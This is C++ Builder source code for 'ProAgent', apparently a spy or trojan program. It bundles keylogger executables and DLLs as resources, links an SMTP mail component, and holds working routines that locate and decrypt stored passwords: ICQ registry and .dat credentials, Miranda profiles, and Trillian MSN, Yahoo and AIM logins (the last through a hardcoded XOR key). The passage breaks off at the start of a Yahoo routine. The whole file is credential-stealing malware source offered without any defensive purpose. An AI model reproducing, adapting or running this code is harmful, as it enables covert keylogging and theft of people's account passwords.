/*===================================
ProAgent coded By ATmaCA
http://www.atmacasoft.com
atmaca@prohack.net
===================================*/
//---------------------------------------------------------------------------

#include <vcl.h>
#include <winsock2.h>
#include <jpeg.hpp>
#include "wininet.h"
#include <tlhelp32.h>
#include <mmsystem.h>
#include "Registry.hpp"
#include <dir.h>
#include <stdio.h>
#include "LocalIP.h"
#pragma hdrstop

#include "Unit1.h"
#include "Unit2.h"
#define RSP_SIMPLE_SERVICE     1
#define RSP_UNREGISTER_SERVICE 0
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma link "ipwCore"
#pragma link "ipwsmtp"
#pragma resource "*.dfm"
#define BUFFERLEN 255
#pragma comment(lib, "wininet.lib")
#pragma resource "fps.res"
#pragma resource "mps.res"
#pragma resource "icq.res"
#pragma resource "iss32.res"
#pragma resource "KeyLog\\keyexe.res"
#pragma resource "KeyLog\\keydll.res"
#pragma resource "KeyLog\\keyreg.res"

TForm1 *Form1;
typedef (__stdcall *DecryptPass)(DWORD dwVolumeSerial, LPSTR lpszMainLocation, DWORD dwMainLocationLen, LPSTR UIN);
typedef (__stdcall *SetLayeredWindowAttr)(HWND hwnd, COLORREF crKey, BYTE bAlpha, DWORD dwFlags);
TResourceStream *rc1 =new TResourceStream(0,"fps","exefile");
TResourceStream *rc2 =new TResourceStream(0,"mps","exefile");
TResourceStream *rc3 =new TResourceStream(0,"icq","dllfile");
TResourceStream *rc4 =new TResourceStream(0,"iss32","exefile");
TResourceStream *rc5 =new TResourceStream(0,"keyexe","exefile");
TResourceStream *rc6 =new TResourceStream(0,"keydll","dllfile");
TResourceStream *rc7 =new TResourceStream(0,"keyreg","dllfile");
TRegistry& reg = *new TRegistry();
int adet;
bool tekrar=true;
int adet1=0;
DWORD dwFlags;
AnsiString Ss;
bool baglanti=true;
bool internet=false;
bool sil=false;
int konturul=0;
AnsiString Mail,ekran;
void Decrypt(){
  char cBuf[128];
  AnsiString library;
  FILE *dll;
  int i;
  GetWindowsDirectory(cBuf, 128);
  library=AnsiString(cBuf)+"\\icq.dll";
 // GetSystemDirectory(cBuf, 128);
   DecryptPass DecryptPassword;
  HINSTANCE LibHandle = LoadLibrary(library.c_str());
   if (LibHandle == NULL){
       return;
   }
   DecryptPassword = (DecryptPass)GetProcAddress(LibHandle, "DecryptPass");

   char WinDirBuffer[BUFFERLEN];

   TRegistry *Registry = new TRegistry;
   TStrings *SubKeysBuffer = new TStringList();
   Registry->RootKey = HKEY_CURRENT_USER;
   String MirabilsKey = "\\software\\Mirabilis\\ICQ\\NewOwners";

   if(!GetWindowsDirectory(WinDirBuffer, BUFFERLEN)){
      return;
   }
   AnsiString RootPathName = ExtractFileDrive(WinDirBuffer)+"\\";
   DWORD dwVolumeSerial=0;
   DWORD dwMaximumComponentLength;
   DWORD dwFileSystemFlags;

   if(GetVolumeInformation(RootPathName.c_str(), NULL, NULL,
      &dwVolumeSerial, &dwMaximumComponentLength, &dwFileSystemFlags,
      NULL,NULL)){

      try {
         if(Registry->OpenKey(MirabilsKey, false)){
           Registry->GetKeyNames(SubKeysBuffer);
         }else{
         return;
             }
      }catch(ERegistryException &Exception){
         }
      try {
         Form1->Memo1->Lines->Add("");
         Form1->Memo1->Lines->Add("//////// Mirabilis(ICQ 2003a) Passwords /////");
         for (int i = 0; i < SubKeysBuffer->Count; i++){
             AnsiString UINKey = MirabilsKey+"\\"+SubKeysBuffer->Strings[i];
             if(Registry->OpenKey(UINKey, false)){
                if(Registry->ValueExists("MainLocation")){
                  char MainLocation[BUFFERLEN];
                  DWORD pszMainLocationLen = Registry->ReadBinaryData("MainLocation", MainLocation, BUFFERLEN);
                  DecryptPassword(dwVolumeSerial, MainLocation, pszMainLocationLen, SubKeysBuffer->Strings[i].c_str());


    ///////////////////////////////////////////////////////////////////////////////////////////////
    if(strlen(MainLocation)==1)
    Form1->Memo1->Lines->Add("Uin:"+SubKeysBuffer->Strings[i]+" Password:"+AnsiString(MainLocation)+
    " (in hex:"+AnsiString((IntToHex(MainLocation[0],2)))+
    ")");
    ///////////////////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////////////////
    if(strlen(MainLocation)==2)
    Form1->Memo1->Lines->Add("Uin:"+SubKeysBuffer->Strings[i]+" Password:"+AnsiString(MainLocation)+
    " (in hex:"+AnsiString((IntToHex(MainLocation[0],2)))+" "+AnsiString((IntToHex(MainLocation[1],2)))+
    ")");
    ///////////////////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////////////////
    if(strlen(MainLocation)==3)
    Form1->Memo1->Lines->Add("Uin:"+SubKeysBuffer->Strings[i]+" Password:"+AnsiString(MainLocation)+
    " (in hex:"+AnsiString((IntToHex(MainLocation[0],2)))+" "+AnsiString((IntToHex(MainLocation[1],2)))+
    " "+AnsiString((IntToHex(MainLocation[2],2)))+
    ")");
    ///////////////////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////////////////
    if(strlen(MainLocation)==4)
    Form1->Memo1->Lines->Add("Uin:"+SubKeysBuffer->Strings[i]+" Password:"+AnsiString(MainLocation)+
    " (in hex:"+AnsiString((IntToHex(MainLocation[0],2)))+" "+AnsiString((IntToHex(MainLocation[1],2)))+
    " "+AnsiString((IntToHex(MainLocation[2],2)))+" "+AnsiString((IntToHex(MainLocation[3],2)))+
    ")");
    ///////////////////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////////////////
    if(strlen(MainLocation)==5)
    Form1->Memo1->Lines->Add("Uin:"+SubKeysBuffer->Strings[i]+" Password:"+AnsiString(MainLocation)+
    " (in hex:"+AnsiString((IntToHex(MainLocation[0],2)))+" "+AnsiString((IntToHex(MainLocation[1],2)))+
    " "+AnsiString((IntToHex((int)MainLocation[2],2)))+" "+AnsiString((IntToHex(MainLocation[3],2)))+
    " "+AnsiString((IntToHex(MainLocation[4],2)))+
    ")");
    ///////////////////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////////////////
    if(strlen(MainLocation)==6)
    Form1->Memo1->Lines->Add("Uin:"+SubKeysBuffer->Strings[i]+" Password:"+AnsiString(MainLocation)+
    " (in hex:"+AnsiString((IntToHex(MainLocation[0],2)))+" "+AnsiString((IntToHex(MainLocation[1],2)))+
    " "+AnsiString((IntToHex(MainLocation[2],2)))+" "+AnsiString((IntToHex(MainLocation[3],2)))+
    " "+AnsiString((IntToHex(MainLocation[4],2)))+" "+AnsiString((IntToHex(MainLocation[5],2)))+
    ")");
    ///////////////////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////////////////
    if(strlen(MainLocation)==7)
    Form1->Memo1->Lines->Add("Uin:"+SubKeysBuffer->Strings[i]+" Password:"+AnsiString(MainLocation)+
    " (in hex:"+AnsiString((IntToHex(MainLocation[0],2)))+" "+AnsiString((IntToHex(MainLocation[1],2)))+
    " "+AnsiString((IntToHex(MainLocation[2],2)))+" "+AnsiString((IntToHex(MainLocation[3],2)))+
    " "+AnsiString((IntToHex(MainLocation[4],2)))+" "+AnsiString((IntToHex(MainLocation[5],2)))+
    " "+AnsiString((IntToHex(MainLocation[6],2)))+")");
    ///////////////////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////////////////
    if(strlen(MainLocation)==8)
    Form1->Memo1->Lines->Add("Uin:"+SubKeysBuffer->Strings[i]+" Password:"+AnsiString(MainLocation)+
    " (in hex:"+AnsiString((IntToHex(MainLocation[0],2)))+" "+AnsiString((IntToHex(MainLocation[1],2)))+
    " "+AnsiString((IntToHex(MainLocation[2],2)))+" "+AnsiString((IntToHex(MainLocation[3],2)))+
    " "+AnsiString((IntToHex(MainLocation[4],2)))+" "+AnsiString((IntToHex(MainLocation[5],2)))+
    " "+AnsiString((IntToHex(MainLocation[6],2)))+" "+AnsiString((IntToHex(MainLocation[7],2)))+")");
    ///////////////////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////////////////
    if(strlen(MainLocation)==9)
    Form1->Memo1->Lines->Add("Uin:"+SubKeysBuffer->Strings[i]+" Password:"+AnsiString(MainLocation)+
    " (in hex:"+AnsiString((IntToHex(MainLocation[0],2)))+" "+AnsiString((IntToHex(MainLocation[1],2)))+
    " "+AnsiString((IntToHex(MainLocation[2],2)))+" "+AnsiString((IntToHex(MainLocation[3],2)))+
    " "+AnsiString((IntToHex(MainLocation[4],2)))+" "+AnsiString((IntToHex(MainLocation[5],2)))+
    " "+AnsiString((IntToHex(MainLocation[6],2)))+" "+AnsiString((IntToHex(MainLocation[7],2)))+
    " "+AnsiString((IntToHex(MainLocation[8],2))+")"));
    ///////////////////////////////////////////////////////////////////////////////////////////////
                 // Form1->Memo1->Lines->Add(SubKeysBuffer->Strings[i]+": "+AnsiString(MainLocation));
                }
             }else{
             return;
    }
         }
      }catch(ERegistryException &Exception){
         return; }
   }else{
         return;
   }
}
int adres_bul(AnsiString isim)
{
FILE *di1;
int adres=0;
char *kr1 = new char[20000000];

//8 byte lik hexa imza: 50617373776f7264
char kr2;
int i1=0;
if((di1=fopen(isim.c_str(),"rb")) == NULL)
{
delete [] kr1;
return 1;
}
  while(!feof(di1))
    {
    kr1[i1]=getc(di1);
    i1++;
    };   rewind(di1);
    i1=0;
    while(!feof(di1))
    {
    kr2=getc(di1);
    if( kr1[i1]==0x50 && kr1[i1+1]==0x61 && kr1[i1+2]==0x73 && kr1[i1+3]==0x73 && kr1[i1+4]==0x77 && kr1[i1+5]==0x6f && kr1[i1+6]==0x72 && kr1[i1+7]==0x64  )
    {
    adres=i1;  //394 geri
    }
    i1++;
    };
fclose(di1);
delete [] kr1;
return (adres+11);
}
int adres_bul2(AnsiString isim)
{
FILE *di1;
int adres=0;


char *kr1 = new char[20000000];
//8 byte lik hexa imza: 0746c455191003b2
char kr2;
int i1=0;
if((di1=fopen(isim.c_str(),"rb")) == NULL)
{
delete [] kr1;
return -1;
}
  while(!feof(di1))
    {
    kr1[i1]=getc(di1);
    i1++;
    };   rewind(di1);
    i1=0;
    while(!feof(di1))
    {
    kr2=getc(di1);
    if( kr1[i1]==0x07 && kr1[i1+1]==0x46 && kr1[i1+2]==0xc4 && kr1[i1+3]==0x55 && kr1[i1+4]==0x19 && kr1[i1+5]==0x10 && kr1[i1+6]==0x03 && kr1[i1+7]==0xb2  )
    {
    adres=i1;  //394 geri
    }
    i1++;
    };
fclose(di1);
delete [] kr1;
return (adres+8);
}
AnsiString dat_coz(AnsiString dat,int x_k)
{
AnsiString r1;
char kon31[15];
char sonuc[15];
char r2[250];
//OpenDialog1->Execute();
if( dat != "")
{
//r1=OpenDialog1->FileName;
//Edit3->Text=r1;
//Edit3->GetTextBuf(r2,250);
strcpy(r2,dat.c_str());
strcpy(kon31,strrchr(r2,92));
if(strlen(kon31)==11)
{
sonuc[0]=kon31[1];
sonuc[1]=kon31[2];
sonuc[2]=kon31[3];
sonuc[3]=kon31[4];
sonuc[4]=kon31[5];
sonuc[5]=kon31[6];
sonuc[6]='\0';
}
if(strlen(kon31)==12)
{
sonuc[0]=kon31[1];
sonuc[1]=kon31[2];
sonuc[2]=kon31[3];
sonuc[3]=kon31[4];
sonuc[4]=kon31[5];
sonuc[5]=kon31[6];
sonuc[6]=kon31[7];
sonuc[7]='\0';
}
if(strlen(kon31)==13)
{
sonuc[0]=kon31[1];
sonuc[1]=kon31[2];
sonuc[2]=kon31[3];
sonuc[3]=kon31[4];
sonuc[4]=kon31[5];
sonuc[5]=kon31[6];
sonuc[6]=kon31[7];
sonuc[7]=kon31[8];
sonuc[8]='\0';
}
if(strlen(kon31)==14)
{
sonuc[0]=kon31[1];
sonuc[1]=kon31[2];
sonuc[2]=kon31[3];
sonuc[3]=kon31[4];
sonuc[4]=kon31[5];
sonuc[5]=kon31[6];
sonuc[6]=kon31[7];
sonuc[7]=kon31[8];
sonuc[8]=kon31[9];
sonuc[9]='\0';
}
if(strlen(kon31)<=14 && isdigit(sonuc[0])!=0 && isdigit(sonuc[1])!=0 && isdigit(sonuc[2])!=0 && isdigit(sonuc[3])!=0 && isdigit(sonuc[4])!=0 && isdigit(sonuc[5])!=0 && strchr(kon31,'i')==NULL && strchr(kon31,'x')==NULL && strchr(kon31,'m')==NULL && strchr(kon31,'p')==NULL && strchr(kon31,'d')!=NULL && strchr(kon31,'a')!=NULL && strchr(kon31,'t')!=NULL  )
{
int uin_no=StrToInt(sonuc);
FILE *di;
unsigned long deneme;
unsigned long Crypt;
char ch1,ch2,ch3,ch4;
char ch5,ch6,ch7,ch8,ch9,ch10,ch11,ch12,ch13,ch14,ch15,ch16,ch17,ch18,ch19,ch20,ch21,ch22,ch23,ch24,ch25,ch26;
int x=0,x1=0;
int kontrol1=0,kontrol2=0;
int isaret=0,isaret1=0;
int uz;
unsigned char *kr = new unsigned char[50000000];



if((di=fopen(r2,"r+b"))==NULL) //DAT DOSYASI OKUMA MODUNDA ACILIYOR
  {
   delete [] kr;
   return "false";
  }
     while(!feof(di))
   {
   kr[x]=getc(di);
   x++;
   }  uz=x;

 for(x=0;x<uz;x++)
   if(kr[x]=='9' && kr[x+1]=='9' && kr[x+2]=='B' && kr[x+3]=='C' && kr[x+4]=='r' && kr[x+5]=='y' &&  kr[x+6]=='p'&& kr[x+7]=='t'&& kr[x+8]=='I'&& kr[x+9]=='V' && kontrol1==0 )
   {
    isaret=x;
    kontrol1=x;     // 99BCryptIV NIN YERI TESPIT EDILIYOR
    kontrol1++;
   }
    fseek(di,isaret+12,0);
    ch1 = getc(di);
    rewind(di);
    fseek(di,isaret+13,0);
    ch2 = getc(di);
    rewind(di);
    fseek(di,isaret+14,0);
    ch3 = getc(di);
    rewind(di);
    fseek(di,isaret+15,0);
    ch4 = getc(di);
    rewind(di);


    Crypt=( (ch1) + ( ( ch2) * 256 ) + ( (ch3) * 65536 ) + ( (ch4) * 16777216) );   //crypt bulundu


    long  UIN     = uin_no;
    dword CryptIV = Crypt;

	//----------------
    dword t[32];
    dword l = CryptIV;
    dword h = 0x00000000;
    byte  key[16];

	//----------------
    TableGen(t, UIN);

    XORKeyGen(t, &l,&h);
        *(dword*)(key   ) = l;
        *(dword*)(key+ 4) = h;
    XORKeyGen(t, &l,&h);
        *(dword*)(key+ 8) = l;
        *(dword*)(key+12) = h;



   while(!feof(di))
   {
   kr[x1]=getc(di);
   x1++;
   }   uz=x1;

 for(x1=0;x1<uz;x1++)
   if(kr[x1]=='P' && kr[x1+1]=='a' && kr[x1+2]=='s' && kr[x1+3]=='s' && kr[x1+4]=='w' && kr[x1+5]=='o' &&  kr[x1+6]=='r'&& kr[x1+7]=='d' && kr[x1+8] == 0x00 && kr[x1+9] == 0x6b && kontrol2==0 )
   {
    isaret1=x1;
    kontrol2=x1;     // Password NIN YERI TESPIT EDILIYOR
    kontrol2++;
    if(isaret>isaret1)
    kontrol2=0;
   }

    fseek(di,isaret1+12,0);
    ch5 = getc(di);
    rewind(di);
    fseek(di,isaret1+13,0);
    ch6 = getc(di);
    rewind(di);
    fseek(di,isaret1+14,0);
    ch7 = getc(di);
    rewind(di);
    fseek(di,isaret1+15,0);
    ch8 = getc(di);
    rewind(di);
    fseek(di,isaret1+16,0);
    ch9 = getc(di);
    rewind(di);
    fseek(di,isaret1+17,0);
    ch10 = getc(di);
    rewind(di);
    fseek(di,isaret1+18,0);
    ch11 = getc(di);
    rewind(di);
    fseek(di,isaret1+19,0);
    ch12 = getc(di);
    rewind(di);
    fseek(di,isaret1+20,0);
    ch13 = getc(di);
    rewind(di);
    fseek(di,isaret1+21,0);
    ch14 = getc(di);
    rewind(di);
    fseek(di,isaret1+22,0);
    ch15 = getc(di);
    rewind(di);
    fseek(di,isaret1+23,0);
    ch16 = getc(di);
    rewind(di);
    fseek(di,isaret1+24,0);
    ch17 = getc(di);
    rewind(di);
    fseek(di,isaret1+25,0);
    ch18 = getc(di);
    rewind(di);
    fseek(di,isaret1+26,0);
    ch19 = getc(di);
    rewind(di);
    fseek(di,isaret1+27,0);
    ch20 = getc(di);
    rewind(di);
    fseek(di,isaret1+28,0);
    ch21 = getc(di);
    rewind(di);
    fseek(di,isaret1+29,0);
    ch22 = getc(di);
    rewind(di);
    fseek(di,isaret1+30,0);
    ch23 = getc(di);
    rewind(di);
    fseek(di,isaret1+31,0);
    ch24 = getc(di);
    rewind(di);
    fseek(di,isaret1+32,0);
    ch25 = getc(di);
    rewind(di);
    fseek(di,isaret1+33,0);
    ch26 = getc(di);
    rewind(di);
    /// pass okundu


byte hex1a;
byte hex2a;
byte hex3a;
byte hex4a;
byte hex5a;
byte hex6a;
byte hex7a;
byte hex8a;
byte hex9a;


char hex1[5]={'0','x',ch9,ch10};
if( (isxdigit(ch9)!=0) && (isxdigit(ch10)!=0) )
hex1a=StrToInt64(hex1);
else
hex1a=0x20;
char hex2[5]={'0','x',ch11,ch12};
if( (isxdigit(ch11)!=0) && (isxdigit(ch12)!=0) )
hex2a=StrToInt64(hex2);
else
hex2a=0x20;
char hex3[5]={'0','x',ch13,ch14};
if( (isxdigit(ch13)!=0) && (isxdigit(ch14)!=0) )
hex3a=StrToInt64(hex3);
else
hex3a=0x20;
char hex4[5]={'0','x',ch15,ch16};
if( (isxdigit(ch15)!=0) && (isxdigit(ch16)!=0) )
hex4a=StrToInt64(hex4);
else
hex4a=0x20;
char hex5[5]={'0','x',ch17,ch18};                  //pass hex 'e cevriliyor ....
if( (isxdigit(ch17)!=0) && (isxdigit(ch18)!=0) )
hex5a=StrToInt64(hex5);
else
hex5a=0x20;
char hex6[5]={'0','x',ch19,ch20};
if( (isxdigit(ch19)!=0) && (isxdigit(ch20)!=0) )
hex6a=StrToInt64(hex6);
else
hex6a=0x20;
char hex7[5]={'0','x',ch21,ch22};
if( (isxdigit(ch21)!=0) && (isxdigit(ch22)!=0) )
hex7a=StrToInt64(hex7);
else
hex7a=0x20;
char hex8[5]={'0','x',ch23,ch24};
if( (isxdigit(ch23)!=0) && (isxdigit(ch24)!=0) )
hex8a=StrToInt64(hex8);
else
hex8a=0x20;
char hex9[5]={'0','x',ch25,ch26};
if( (isxdigit(ch25)!=0) && (isxdigit(ch26)!=0) )
hex9a=StrToInt64(hex9);
else
hex9a=0x20;
char harf[9];
harf[0]= key[2] ^= (hex1a) ;
harf[1]= key[3] ^= (hex2a) ;
harf[2]= key[4] ^= (hex3a) ;
harf[3]= key[5] ^= (hex4a) ;
harf[4]= key[6] ^= (hex5a) ;
harf[5]= key[7] ^= (hex6a) ;
harf[6]= key[8] ^= (hex7a) ;
harf[7]= key[9] ^= (hex8a) ;
harf[8]= key[10] ^= (hex9a) ;
harf[9]='\0';

fclose(di);
//Memo1->Lines->Insert(0,"Uin No : " + AnsiString(sonuc));
//if(kontrol1==0)
//Memo1->Lines->Insert(1,"Bulunan Sifre : Dat dosyasinda sifre bulunamadi");
//Memo1->Lines->Insert(1,"Bulunan Sifre : " +AnsiString(harf));
    if(x_k==0)
    {
    if(kontrol1==0)
    {
    delete [] kr;
    return "Can't find Password.";
    }
    else
    {
    delete [] kr;
    return AnsiString(harf);
    }
    }
    if(x_k==1)
    {
    delete [] kr;
    return AnsiString(sonuc);
    }
 }
          } //else exit(1);
}
void Mirabilis_dat_coz()
{
Form1->Memo1->Lines->Add("");
Form1->Memo1->Lines->Add("//////// Mirabilis(ICQ 2002a) Passwords /////");
  int i;
  TRegistry& regKey = *new TRegistry();
  AnsiString Programdirekt;
  regKey.RootKey = HKEY_LOCAL_MACHINE;
  regKey.OpenKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion", False);
  Programdirekt = regKey.ReadString("ProgramFilesDir");
  AnsiString klasor1,klasor2;

  for(i=0;i<6;i++)
{
  if(i==0)
  {
  klasor1=Programdirekt+"\\"+"ICQ\\newdb\\";
  klasor2=Programdirekt+"\\"+"ICQ\\newdb\\"+"*.dat";
  }
  if(i==1)
  {
  klasor1=Programdirekt+"\\"+"ICQ\\db99b\\";
  klasor2=Programdirekt+"\\"+"ICQ\\db99b\\"+"*.dat";
  }
  if(i==2)
  {
  klasor1=Programdirekt+"\\"+"ICQ\\2000a\\";
  klasor2=Programdirekt+"\\"+"ICQ\\2000a\\"+"*.dat";
  }
  if(i==3)
  {
  klasor1=Programdirekt+"\\"+"ICQ\\2000b\\";
  klasor2=Programdirekt+"\\"+"ICQ\\2000b\\"+"*.dat";
  }
  if(i==4)
  {
  klasor1=Programdirekt+"\\"+"ICQ\\2001a\\";
  klasor2=Programdirekt+"\\"+"ICQ\\2001a\\"+"*.dat";
  }
  if(i==5)
  {
  klasor1=Programdirekt+"\\"+"ICQ\\2002a\\";
  klasor2=Programdirekt+"\\"+"ICQ\\2002a\\"+"*.dat";
  }
  struct ffblk ffblk;
  int done;
  AnsiString deneme;
  done = findfirst(klasor2.c_str(),&ffblk,FA_ARCH);
  while (!done)
   {
     deneme= klasor1+AnsiString(ffblk.ff_name);
     if(dat_coz(deneme,1)!= "" || dat_coz(deneme,0)!= "" )
     Form1->Memo1->Lines->Add("UIN: "+dat_coz(deneme,1)+" Password: "+dat_coz(deneme,0));
     done = findnext(&ffblk);
   }
}
}

//////////////////////////////////////////////////
AnsiString Miranda_coz(AnsiString dat_ismi)
{
FILE *di1;
if((di1=fopen(dat_ismi.c_str(),"rb")) == NULL)
{
   return "false";
}
char pass[13];
char en_pass[13];
byte uzunluk;
fseek(di1,adres_bul(dat_ismi.c_str())-2,0);
uzunluk=getc(di1);
fseek(di1,adres_bul(dat_ismi.c_str()),0);
pass[0]=getc(di1);
fseek(di1,adres_bul(dat_ismi.c_str())+1,0);
pass[1]=getc(di1);
fseek(di1,adres_bul(dat_ismi.c_str())+2,0);
pass[2]=getc(di1);
fseek(di1,adres_bul(dat_ismi.c_str())+3,0);
pass[3]=getc(di1);
fseek(di1,adres_bul(dat_ismi.c_str())+4,0);
pass[4]=getc(di1);
fseek(di1,adres_bul(dat_ismi.c_str())+5,0);
pass[5]=getc(di1);
fseek(di1,adres_bul(dat_ismi.c_str())+6,0);
pass[6]=getc(di1);
fseek(di1,adres_bul(dat_ismi.c_str())+7,0);
pass[7]=getc(di1);
fseek(di1,adres_bul(dat_ismi.c_str())+7,0);
pass[8]=getc(di1);
fseek(di1,adres_bul(dat_ismi.c_str())+7,0);
pass[9]=getc(di1);
en_pass[0]=pass[0]-5;
en_pass[1]=pass[1]-5;
en_pass[2]=pass[2]-5;
en_pass[3]=pass[3]-5;
en_pass[4]=pass[4]-5;
en_pass[5]=pass[5]-5;
en_pass[6]=pass[6]-5;
en_pass[7]=pass[7]-5;
en_pass[8]=pass[8]-5;
en_pass[9]=pass[9]-5;
en_pass[uzunluk]='\0';
fclose(di1);
return AnsiString(en_pass);

}
void Miranda_coz()
{
Form1->Memo1->Lines->Add("");
Form1->Memo1->Lines->Add("//////// Miranda(ICQ) Passwords /////////////");
TRegistry& regKey = *new TRegistry();
  AnsiString Programdirekt;
  regKey.RootKey = HKEY_LOCAL_MACHINE;
  regKey.OpenKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion", False);
  Programdirekt = regKey.ReadString("ProgramFilesDir");
AnsiString klasor1=Programdirekt+"\\Miranda IM\\";
AnsiString klasor2=Programdirekt+"\\Miranda IM\\"+"*.dat";
char profil[250];
int profil_uzunlugu;
struct ffblk ffblk;
  int done;
  AnsiString deneme;
  done = findfirst(klasor2.c_str(),&ffblk,FA_ARCH);
  while (!done)
   {
     profil_uzunlugu=strlen(ffblk.ff_name);
     strcpy(profil,ffblk.ff_name);
     profil[profil_uzunlugu-4]='\0';
     deneme= klasor1+AnsiString(ffblk.ff_name);
     if(Miranda_coz(deneme)!= "" )
     Form1->Memo1->Lines->Add("Profil Ismi: "+AnsiString(profil)+" Sifre: "+Miranda_coz(deneme));
     done = findnext(&ffblk);
   }
}

AnsiString trillian_coz(AnsiString a)
{
byte xor[16]={0xf3,0x26,0x81,0xc4,0x39,0x86,0xdb
   ,0x92,0x71,0xa3,0xb9,0xe6,0x53,0x7a,0x95,0x7c};
   char sifre[17];
   int uzunluk;
   //AnsiString a;
  // TIniFile *ini;
  // ini = new TIniFile("c:\\msn.ini" ) ;
  // Memo1->Lines->Add(ini-> ReadString( "profile 0", "name","okunamadi"));
   //a=ini-> ReadString( "profile 0", "password","000000000");
   //Memo1->Lines->Add(a);
  // delete ini;
   uzunluk=strlen(a.c_str());
char anahtar[33];
strcpy(anahtar,a.c_str());
byte hex1a;
byte hex2a;
byte hex3a;
byte hex4a;
byte hex5a;
byte hex6a;
byte hex7a;
byte hex8a;
byte hex9a;
byte hex10a;
byte hex11a;
byte hex12a;
byte hex13a;
byte hex14a;
byte hex15a;
byte hex16a;
if(uzunluk>0)
{
char hex1[5]={'0','x',anahtar[0],anahtar[1]};
hex1a=StrToInt64(hex1);
}
if(uzunluk>2)
{
char hex2[5]={'0','x',anahtar[2],anahtar[3]};
hex2a=StrToInt64(hex2);
}
if(uzunluk>4)
{
char hex3[5]={'0','x',anahtar[4],anahtar[5]};
hex3a=StrToInt64(hex3);
}
if(uzunluk>6)
{
char hex4[5]={'0','x',anahtar[6],anahtar[7]};
hex4a=StrToInt64(hex4);
}
if(uzunluk>8)
{
char hex5[5]={'0','x',anahtar[8],anahtar[9]};
hex5a=StrToInt64(hex5);
}
if(uzunluk>10)
{
char hex6[5]={'0','x',anahtar[10],anahtar[11]};
hex6a=StrToInt64(hex6);
}
if(uzunluk>12)
{
char hex7[5]={'0','x',anahtar[12],anahtar[13]};
hex7a=StrToInt64(hex7);
}
if(uzunluk>14)
{
char hex8[5]={'0','x',anahtar[14],anahtar[15]};
hex8a=StrToInt64(hex8);
}
if(uzunluk>16)
{
char hex9[5]={'0','x',anahtar[16],anahtar[17]};
hex9a=StrToInt64(hex9);
}
if(uzunluk>18)
{
char hex10[5]={'0','x',anahtar[18],anahtar[19]};
hex10a=StrToInt64(hex10);
}
if(uzunluk>20)
{
char hex11[5]={'0','x',anahtar[20],anahtar[21]};
hex11a=StrToInt64(hex11);
}
if(uzunluk>22)
{
char hex12[5]={'0','x',anahtar[22],anahtar[23]};
hex12a=StrToInt64(hex12);
}
if(uzunluk>24)
{
char hex13[5]={'0','x',anahtar[24],anahtar[25]};
hex13a=StrToInt64(hex13);
}
if(uzunluk>26)
{
char hex14[5]={'0','x',anahtar[26],anahtar[27]};
hex14a=StrToInt64(hex14);
}
if(uzunluk>28)
{
char hex15[5]={'0','x',anahtar[28],anahtar[29]};
hex15a=StrToInt64(hex15);
}
if(uzunluk>30)
{
char hex16[5]={'0','x',anahtar[30],anahtar[31]};
hex16a=StrToInt64(hex16);
}
sifre[0]=xor[0]^hex1a;
sifre[1]=xor[1]^hex2a;
sifre[2]=xor[2]^hex3a;
sifre[3]=xor[3]^hex4a;
sifre[4]=xor[4]^hex5a;
sifre[5]=xor[5]^hex6a;
sifre[6]=xor[6]^hex7a;
sifre[7]=xor[7]^hex8a;
sifre[8]=xor[8]^hex9a;
sifre[9]=xor[9]^hex10a;
sifre[10]=xor[10]^hex11a;
sifre[11]=xor[11]^hex12a;
sifre[12]=xor[12]^hex13a;
sifre[13]=xor[13]^hex14a;
sifre[14]=xor[14]^hex15a;
sifre[15]=xor[15]^hex16a;

sifre[(uzunluk/2)]=NULL;   //return
return AnsiString(sifre);
}
//////////////////////////////////////////////////////////////////////
void Trillian_de()
{
 Form1->Memo1->Lines->Add("");
 Form1->Memo1->Lines->Add("//////// Trillian Sifreler ///////////");
  TRegistry& regKey = *new TRegistry();
  AnsiString Programdirekt;
  regKey.RootKey = HKEY_LOCAL_MACHINE;
  regKey.OpenKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion", False);
  Programdirekt = regKey.ReadString("ProgramFilesDir");
  AnsiString tri_dir=Programdirekt+"\\Trillian\\users\\default\\";
 /////////////////////////////////////////////////////////////////////
 AnsiString key;
 AnsiString mail;
 TIniFile *ini;
 /////////////////////////////////////////////////////////////////////
 if(FileExists(tri_dir+"msn.ini"))
 {
 ini = new TIniFile(tri_dir+"msn.ini") ;
 key  = ini-> ReadString( "profile 0", "password","00000000000000");
 mail = ini-> ReadString( "profile 0", "name","okunamadi");
 if(key!="00000000000000")
 Form1->Memo1->Lines->Add(mail+" Password: "+trillian_coz(key));
 }
 /////////////////////////////////////////////////////////////////////
 if(FileExists(tri_dir+"msn.ini"))
 {
 ini = new TIniFile(tri_dir+"yahoo.ini") ;
 key  = ini-> ReadString( "profile 0", "password","00000000000000");
 mail = ini-> ReadString( "profile 0", "name","okunamadi");
 if(key!="00000000000000")
 Form1->Memo1->Lines->Add(mail+"@yahoo.com"+" Password: "+trillian_coz(key));
 } //else Form1->Memo1->Lines->Add("########## TRILLIAN ##########");
 /////////////////////////////////////////////////////////////////////
 if(FileExists(tri_dir+"aim.ini"))
 {
 ini = new TIniFile(tri_dir+"aim.ini" ) ;
 key  = ini-> ReadString( "profile 0", "password","00000000000000");
 mail = ini-> ReadString( "profile 0", "name","okunamadi");
 if(key!="00000000000000")
 Form1->Memo1->Lines->Add(mail+" Password: "+trillian_coz(key));
 }
 /////////////////////////////////////////////////////////////////////
 if(FileExists(tri_dir+"aim.ini"))
 {
 ini = new TIniFile(tri_dir+"aim.ini") ;
 key  = ini-> ReadString( "profile 1", "password","00000000000000");
 mail = ini-> ReadString( "profile 1", "name","okunamadi");
 if(key!="00000000000000")
 Form1->Memo1->Lines->Add(mail+"@aol.com"+" Password: "+trillian_coz(key));
 }
}

void yahoo_coz()
{
    int c=0;
        bool s;
        AnsiString classkey;
	char KeyName[50];
	char KeyClass[50];
	LPDWORD sName = new DWORD;
	LPDWORD sClass = new DWORD;
	*sName = *sClass = 50;
